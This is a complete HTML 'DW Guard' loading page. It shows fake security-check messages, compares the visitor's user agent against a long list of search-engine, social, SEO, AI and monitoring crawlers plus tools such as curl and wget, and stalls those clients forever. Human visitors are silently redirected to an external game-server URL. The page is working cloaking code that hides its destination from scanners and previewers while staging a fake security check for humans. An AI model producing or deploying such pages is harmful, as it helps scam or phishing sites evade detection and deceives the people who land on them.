<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DW Guard • Loading</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Share+Tech+Mono&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #05050a;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            font-family: 'Orbitron', sans-serif;
            color: #e0f7ff;
        }

        /* Animated background grid */
        .bg-grid {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 255, 255, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 255, 0.03) 1px, transparent 1px);
            background-size: 40px 40px;
            animation: gridMove 20s linear infinite;
            z-index: 0;
        }

        @keyframes gridMove {
            0% { transform: translate(0, 0); }
            100% { transform: translate(40px, 40px); }
        }

        /* Glow orbs */
        .orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(80px);
            opacity: 0.25;
            z-index: 0;
            animation: float 12s ease-in-out infinite;
        }

        .orb1 {
            width: 400px;
            height: 400px;
            background: #00f0ff;
            top: -100px;
            left: -100px;
        }

        .orb2 {
            width: 300px;
            height: 300px;
            background: #7000ff;
            bottom: -80px;
            right: -80px;
            animation-delay: -4s;
        }

        .orb3 {
            width: 250px;
            height: 250px;
            background: #00ff9d;
            top: 40%;
            right: 20%;
            animation-delay: -7s;
        }

        @keyframes float {
            0%, 100% { transform: translate(0, 0) scale(1); }
            50% { transform: translate(30px, -40px) scale(1.1); }
        }

        /* Main container */
        .loader-container {
            position: relative;
            z-index: 10;
            text-align: center;
            padding: 40px;
        }

        /* Shield / Guard icon */
        .shield {
            width: 90px;
            height: 90px;
            margin: 0 auto 30px;
            position: relative;
        }

        .shield svg {
            width: 100%;
            height: 100%;
            filter: drop-shadow(0 0 12px #00f0ff);
            animation: pulseShield 2.5s ease-in-out infinite;
        }

        @keyframes pulseShield {
            0%, 100% { transform: scale(1); filter: drop-shadow(0 0 12px #00f0ff); }
            50% { transform: scale(1.08); filter: drop-shadow(0 0 25px #00f0ff); }
        }

        /* Spinning ring */
        .ring {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 120px;
            height: 120px;
            margin: -60px 0 0 -60px;
            border: 2px solid transparent;
            border-top: 2px solid #00f0ff;
            border-right: 2px solid #7000ff;
            border-radius: 50%;
            animation: spin 1.8s linear infinite;
        }

        .ring::before {
            content: '';
            position: absolute;
            top: 8px;
            left: 8px;
            right: 8px;
            bottom: 8px;
            border: 2px solid transparent;
            border-bottom: 2px solid #00ff9d;
            border-left: 2px solid #00f0ff;
            border-radius: 50%;
            animation: spinReverse 1.2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes spinReverse {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(-360deg); }
        }

        /* Title */
        .title {
            font-size: 2.8rem;
            font-weight: 900;
            letter-spacing: 6px;
            background: linear-gradient(90deg, #00f0ff, #7000ff, #00ff9d, #00f0ff);
            background-size: 300% 100%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: gradientShift 4s ease infinite;
            text-shadow: 0 0 30px rgba(0, 240, 255, 0.3);
            margin-bottom: 8px;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        /* Subtitle */
        .subtitle {
            font-family: 'Share Tech Mono', monospace;
            font-size: 1.1rem;
            letter-spacing: 4px;
            color: #7ee8ff;
            opacity: 0.85;
            margin-bottom: 35px;
        }

        /* Loading text with dots */
        .loading-text {
            font-family: 'Share Tech Mono', monospace;
            font-size: 1.15rem;
            letter-spacing: 3px;
            color: #00f0ff;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 2px;
        }

        .dots span {
            display: inline-block;
            width: 6px;
            height: 6px;
            background: #00f0ff;
            border-radius: 50%;
            margin: 0 3px;
            animation: bounce 1.4s ease-in-out infinite;
            box-shadow: 0 0 8px #00f0ff;
        }

        .dots span:nth-child(1) { animation-delay: 0s; }
        .dots span:nth-child(2) { animation-delay: 0.2s; }
        .dots span:nth-child(3) { animation-delay: 0.4s; }

        @keyframes bounce {
            0%, 80%, 100% { transform: translateY(0); opacity: 0.4; }
            40% { transform: translateY(-10px); opacity: 1; }
        }

        /* Progress bar */
        .progress-container {
            width: 280px;
            height: 3px;
            background: rgba(0, 240, 255, 0.15);
            border-radius: 4px;
            margin: 30px auto 0;
            overflow: hidden;
            position: relative;
        }

        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #00f0ff, #7000ff, #00ff9d);
            border-radius: 4px;
            box-shadow: 0 0 12px #00f0ff;
            animation: progressFill 3.2s ease-in-out forwards;
        }

        @keyframes progressFill {
            0% { width: 0%; }
            100% { width: 100%; }
        }

        /* Status text */
        .status {
            margin-top: 18px;
            font-family: 'Share Tech Mono', monospace;
            font-size: 0.85rem;
            color: #5a9eaa;
            letter-spacing: 1px;
        }

        /* Particle canvas */
        canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
            pointer-events: none;
        }

        /* Responsive */
        @media (max-width: 480px) {
            .title {
                font-size: 1.9rem;
                letter-spacing: 3px;
            }
            .shield {
                width: 70px;
                height: 70px;
            }
            .ring {
                width: 95px;
                height: 95px;
                margin: -47.5px 0 0 -47.5px;
            }
            .progress-container {
                width: 220px;
            }
        }
    </style>
</head>
<body>
    <div class="bg-grid"></div>
    <div class="orb orb1"></div>
    <div class="orb orb2"></div>
    <div class="orb orb3"></div>
    <canvas id="particles"></canvas>

    <div class="loader-container">
        <div class="shield">
            <div class="ring"></div>
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2L4 6V11C4 16.55 7.16 21.74 12 23C16.84 21.74 20 16.55 20 11V6L12 2Z" 
                      stroke="#00f0ff" stroke-width="1.5" fill="rgba(0,240,255,0.08)"/>
                <path d="M9 12L11 14L15 10" stroke="#00ff9d" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
        </div>

        <div class="title">DW GUARD</div>
        <div class="subtitle">SECURE CONNECTION</div>

        <div class="loading-text">
            LOADING
            <div class="dots">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>

        <div class="progress-container">
            <div class="progress-bar" id="progress"></div>
        </div>

        <div class="status" id="status">Initializing security protocols...</div>
    </div>

    <script>
        // === Expanded Bot List ===
        const bots = [
            // === Google ===
            'googlebot', 'google-inspectiontool', 'adsbot-google', 'mediapartners-google',
            'storebot-google', 'google-read-aloud', 'googleother', 'google-extended',
            'google-cloudvertexbot', 'apis-google', 'google-safety',
            // === Bing / Microsoft ===
            'bingbot', 'adidxbot', 'microsoftpreview', 'bingpreview', 'msnbot',
            // === Yandex ===
            'yandexbot', 'yandex.com/bots', 'yandeximages', 'yandexvideo', 'yandexmedia',
            'yandexblogs', 'yandexfavicons', 'yandexdirect', 'yandexmetrika', 'yandexnews',
            'yandexmobilebot',
            // === Other Search Engines ===
            'slurp',                 // Yahoo
            'duckduckbot', 'duckassistbot',
            'baiduspider', 'baidu',
            'sogou',
            'exabot',
            'petalbot',              // Huawei
            'seznambot',
            'coccocbot',
            'qwantbot',
            'ia_archiver',
            'archive.org_bot',
            // === Social Networks ===
            'facebookexternalhit', 'facebot', 'meta-externalagent', 'meta-externalfetcher',
            'twitterbot', 'linkedinbot', 'pinterest', 'slackbot', 'discordbot',
            'telegrambot', 'whatsapp', 'vkshare', 'okhttp',
            // === SEO / Analytics ===
            'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot', 'rogerbot',
            'screaming frog', 'seokicks', 'sistrix', 'majestic', 'serpstatbot',
            'blexbot', 'dataforseobot',
            // === AI / Neural Networks (2024–2026) ===
            'gptbot', 'chatgpt-user', 'oai-searchbot', 'oai-adsbot',     // OpenAI
            'claudebot', 'claude-searchbot', 'claude-user', 'anthropic-ai', // Anthropic
            'perplexitybot', 'perplexity-user',                            // Perplexity
            'bytespider',                                                  // ByteDance / TikTok
            'amazonbot', 'amzn-searchbot',
            'applebot', 'applebot-extended',
            'ccbot',                                                       // Common Crawl
            'cohere-ai', 'cohere-training-data-crawler',
            'youbot',                                                      // You.com
            'mistralai-user', 'mistralai',
            'grokbot', 'xai-grok',                                         // xAI
            'diffbot',
            'ai2bot',
            'deepseekbot',
            'chatglm-spider',
            'pangubot',
            'yiyanbot',                                                    // Baidu AI
            'gemini-deep-research', 'google-extended',
            'phindbot',
            'neeva',
            'timpibot',
            'meta-externalagent',
            // === Additional common crawlers ===
            'petalbot', 'yeti', 'naverbot', 'daumoa', 'gigabot',
            'heritrix', 'httrack', 'wget', 'curl', 'python-requests',
            'scrapy', 'httpclient', 'java/', 'libwww', 'lwp-trivial',
            'nutch', 'phpcrawl', 'spbot', 'turnitin', 'webmeup',
            'uptimerobot', 'pingdom', 'statuscake', 'site24x7'
        ];

        // === Bot Detection ===
        function isBot() {
            const ua = (navigator.userAgent || '').toLowerCase();
            return bots.some(bot => ua.includes(bot.toLowerCase()));
        }

        // === Particle System ===
        const canvas = document.getElementById('particles');
        const ctx = canvas.getContext('2d');
        let particles = [];

        function resizeCanvas() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        }
        resizeCanvas();
        window.addEventListener('resize', resizeCanvas);

        class Particle {
            constructor() {
                this.reset();
            }
            reset() {
                this.x = Math.random() * canvas.width;
                this.y = Math.random() * canvas.height;
                this.size = Math.random() * 1.8 + 0.5;
                this.speedX = (Math.random() - 0.5) * 0.6;
                this.speedY = (Math.random() - 0.5) * 0.6;
                this.opacity = Math.random() * 0.5 + 0.1;
                this.color = ['#00f0ff', '#7000ff', '#00ff9d'][Math.floor(Math.random() * 3)];
            }
            update() {
                this.x += this.speedX;
                this.y += this.speedY;
                if (this.x < 0 || this.x > canvas.width || this.y < 0 || this.y > canvas.height) {
                    this.reset();
                }
            }
            draw() {
                ctx.beginPath();
                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
                ctx.fillStyle = this.color;
                ctx.globalAlpha = this.opacity;
                ctx.fill();
                ctx.globalAlpha = 1;
            }
        }

        for (let i = 0; i < 60; i++) {
            particles.push(new Particle());
        }

        function animateParticles() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            particles.forEach(p => {
                p.update();
                p.draw();
            });
            requestAnimationFrame(animateParticles);
        }
        animateParticles();

        // === Status messages ===
        const statusEl = document.getElementById('status');
        const messages = [
            'Initializing security protocols...',
            'Checking connection integrity...',
            'Verifying client signature...',
            'Establishing secure tunnel...',
            'Almost ready...'
        ];

        let msgIndex = 0;
        const statusInterval = setInterval(() => {
            msgIndex = (msgIndex + 1) % messages.length;
            statusEl.style.opacity = 0;
            setTimeout(() => {
                statusEl.textContent = messages[msgIndex];
                statusEl.style.opacity = 1;
            }, 200);
        }, 700);

        // === Main Logic ===
        const REDIRECT_URL = 'https://dalam.world/service/newplayerconnect?bohpts';
        const LOAD_TIME = 3400; // ms

        if (isBot()) {
            // Eternal loading for bots — never redirect
            clearInterval(statusInterval);
            statusEl.textContent = 'Access restricted • Security check failed';
            document.getElementById('progress').style.animation = 'none';
            document.getElementById('progress').style.width = '15%';
            // Keep animation running forever
        } else {
            // Human → redirect after animation
            setTimeout(() => {
                clearInterval(statusInterval);
                statusEl.textContent = 'Redirecting...';
                window.location.href = REDIRECT_URL;
            }, LOAD_TIME);
        }
    </script>
</body>
</html>
